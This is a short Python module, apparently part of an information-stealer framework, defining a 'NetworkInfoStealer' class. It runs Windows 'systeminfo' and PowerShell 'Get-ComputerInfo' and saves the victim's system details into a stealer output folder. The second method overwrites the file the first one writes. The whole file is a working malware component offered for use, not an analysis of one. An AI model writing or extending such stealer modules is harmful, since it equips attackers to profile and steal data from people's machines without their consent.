import os
import subprocess

from config.manager import ModuleManager


class NetworkInfoStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "NetworkInfoStealer")

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'system')
        self.systeminfo_filename = os.path.join(self.systeminfo_folder, 'systeminfo.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
            
    def systeminfo(self) -> None:
        data = subprocess.check_output(['systeminfo']).decode('utf-8', errors="backslashreplace")
        with open(self.systeminfo_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def computerinfo(self) -> None:
        data = subprocess.check_output(['powershell', "Get-ComputerInfo"]).decode('utf-8', errors="backslashreplace")
        with open(self.systeminfo_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)

    def run(self) -> None:
        self.systeminfo()
        self.computerinfo()
        
        